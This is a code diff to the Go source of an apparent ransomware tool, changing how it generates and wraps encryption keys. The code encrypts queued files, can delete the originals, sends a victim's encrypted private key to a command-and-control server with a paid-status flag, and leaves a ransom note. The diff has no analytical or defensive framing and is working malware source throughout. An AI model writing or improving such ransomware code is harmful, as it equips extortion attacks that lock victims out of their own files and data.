@@ -2,7 +2,9 @@ package main
 
 import (
 	"crypto/rand"
+	"crypto/rsa"
 	"crypto/sha1"
+	"crypto/x509"
 	"encoding/hex"
 	"errors"
 	"fmt"
@@ -17,11 +19,27 @@ import (
 	"sync"
 )
 
+func generateClientKey() *rsa.PrivateKey {
+	var clientPrivateKey *rsa.PrivateKey
+	var err error
+	if cli.Settings.SuppliedClientPrivateKey != nil {
+		clientPrivateKey = cli.Settings.SuppliedClientPrivateKey
+	} else {
+		clientPrivateKey, err = rsa.GenerateKey(rand.Reader, 2048)
+		if err != nil {
+			log.Fatal(err)
+		}
+	}
+	return clientPrivateKey
+}
+
 func StartEncryption(q *Queue, key string) int {
 	var keySendOffSuccessful bool
-	pubKeyBytes, _ := hex.DecodeString(key)
-	AESKeyBytes, encryptedAESKey, err := handleEncryptionKeys(pubKeyBytes, &keySendOffSuccessful)
-
+	var err error
+	serverPubKeyBytes, _ := hex.DecodeString(key)
+	clientPrivateKey := generateClientKey()
+	clientPublicKey := &clientPrivateKey.PublicKey
+	encryptedPrivateKeyBytes, err := handleClientKey(serverPubKeyBytes, clientPrivateKey, &keySendOffSuccessful)
 	wg := new(sync.WaitGroup)
 	for {
 		file := q.Pop()
@@ -31,7 +49,7 @@ func StartEncryption(q *Queue, key string) int {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
-			wcc.EncryptFile(file, "", AESKeyBytes)
+			wcc.EncryptFile(file, "", clientPublicKey)
 			if cli.Settings.Delete {
 				os.Remove(file)
 			}
@@ -39,7 +57,7 @@ func StartEncryption(q *Queue, key string) int {
 	}
 	wg.Wait()
 	if !keySendOffSuccessful || err != nil {
-		ioutil.WriteFile("e_key.txt", []byte(encryptedAESKey), 0777)
+		ioutil.WriteFile("./e_key.txt", []byte(encryptedPrivateKeyBytes), 0777)
 	}
 	if cli.Settings.LeaveNote {
 		leaveRansomNote(key)
@@ -48,13 +66,13 @@ func StartEncryption(q *Queue, key string) int {
 }
 
 func StartDecryption(q *Queue, key string) int {
-	var keyBytes []byte
+	var clientPrivateKeyBytes []byte
 	if cli.Settings.RawKey {
-		rKeyBytes, fe := ioutil.ReadFile("./raw_key.bin")
+		rClientPrivateKeyBytes, fe := ioutil.ReadFile("./raw_key.bin")
 		if fe != nil {
 			log.Fatal(fe.Error())
 		}
-		keyBytes = rKeyBytes
+		clientPrivateKeyBytes = rClientPrivateKeyBytes
 	} else {
 		var hash []byte
 		var err error
@@ -83,8 +101,13 @@ func StartDecryption(q *Queue, key string) int {
 				log.Fatal("Unexpected error occurred in key retrieval process")
 			}
 		}
-		keyBytes, _ = hex.DecodeString(keyHex)
+		clientPrivateKeyBytes, _ = hex.DecodeString(keyHex)
 	}
+	clientPrivateKey, err := x509.ParsePKCS1PrivateKey(clientPrivateKeyBytes)
+	if err != nil {
+		log.Fatal(err)
+	}
+	// fmt.Println(clientPrivateKeyBytes)
 	wg := new(sync.WaitGroup)
 	for {
 		file := q.Pop()
@@ -94,7 +117,7 @@ func StartDecryption(q *Queue, key string) int {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
-			wcc.DecryptFile(file, keyBytes)
+			wcc.DecryptFile(file, clientPrivateKey)
 			if cli.Settings.Delete {
 				os.Remove(file)
 			}
@@ -104,23 +127,29 @@ func StartDecryption(q *Queue, key string) int {
 	return 0
 }
 
-func handleEncryptionKeys(pubKeyBytes []byte, flag *bool) ([]byte, string, error) {
-	var keyBytes []byte
-	if len(cli.Settings.SuppliedAESKey) == 0 {
-		keyBytes = make([]byte, 32)
-		rand.Read(keyBytes)
-	} else {
-		keyBytes, _ = hex.DecodeString(cli.Settings.SuppliedAESKey)
+func encryptClientPrivateKeyWithServerPublicKey(clientPrivateKey *rsa.PrivateKey, publicKeyPemBytes []byte) ([]byte, error) {
+	privateKeyBytes := x509.MarshalPKCS1PrivateKey(clientPrivateKey)
+	AESKeyBytes := make([]byte, 32)
+	rand.Read(AESKeyBytes)
+	ct := wcc.Encrypt(privateKeyBytes, AESKeyBytes)
+	encryptedKeyHex, err := wcc.EncryptWithRSAPublicKey(AESKeyBytes, string(publicKeyPemBytes))
+	if err != nil {
+		return nil, errors.New("failed to encrypt private key")
 	}
+	encryptedKeyBytes, _ := hex.DecodeString(encryptedKeyHex)
+	encryptedKey := append(ct, encryptedKeyBytes...)
+	return encryptedKey, nil
+}
 
-	encryptedAESKey, err := wcc.EncryptWithRSAPublicKey(keyBytes, string(pubKeyBytes))
-
+func handleClientKey(pubKeyBytes []byte, clientPrivateKey *rsa.PrivateKey, flag *bool) (string, error) {
+	encryptedClientPrivateKey, err := encryptClientPrivateKeyWithServerPublicKey(clientPrivateKey, pubKeyBytes)
+	privateKeyBytes := x509.MarshalPKCS1PrivateKey(clientPrivateKey)
 	if cli.Settings.RawKey {
-		ioutil.WriteFile("./raw_key.bin", keyBytes, 0777)
+		ioutil.WriteFile("./raw_key.bin", x509.MarshalPKCS1PrivateKey(clientPrivateKey), 0777)
 	} else {
 		var resp bool
-		resp, err = utils.SendOffKey(encryptedAESKey, wcc.GetHash(keyBytes), cli.Settings.PaidStatus, cli.Settings.OfflineMode)
-		ioutil.WriteFile("./decryption_hash.bin", []byte(wcc.GetHash(keyBytes)), 0777)
+		resp, err = utils.SendOffKey(string(encryptedClientPrivateKey), wcc.GetHash(privateKeyBytes), cli.Settings.PaidStatus, cli.Settings.OfflineMode)
+		ioutil.WriteFile("./decryption_hash.bin", []byte(wcc.GetHash(privateKeyBytes)), 0777)
 		if err != nil || !resp {
 			log.Println("Failed to contact Command And Control server")
 			err = errors.New("failed to contact CnC server")
@@ -129,7 +158,7 @@ func handleEncryptionKeys(pubKeyBytes []byte, flag *bool) ([]byte, string, error
 			*flag = true
 		}
 	}
-	return keyBytes, encryptedAESKey, err
+	return hex.EncodeToString(encryptedClientPrivateKey), err
 }
 
 func leaveRansomNote(key string) {
